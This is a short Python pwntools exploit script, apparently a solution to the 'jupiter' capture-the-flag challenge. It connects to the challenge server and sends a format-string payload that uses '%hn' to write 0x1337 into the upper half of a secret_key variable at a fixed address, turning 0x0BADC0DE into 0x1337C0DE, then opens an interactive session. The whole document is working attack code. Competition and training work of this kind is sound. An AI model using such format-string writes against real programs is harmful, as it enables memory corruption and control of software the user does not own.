from pwn import *

elf = ELF("./jupiter")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(arch="amd64", os="linux", log_level="debug")

# secret_key at 0x404010
# 0x0BADC0DE -> 0x1337C0DE
# write 0x1337 to 0x404012
p = remote("chal.sunshinectf.games", 25607)
# p = process(["./jupiter"])
# gdb.attach(p)
# pause()
# b"A" * 5 for alignment
p.sendline(f"%{0x1337}c%7$hn".encode() + b"A" * 5 + p64(0x404012))
p.interactive()
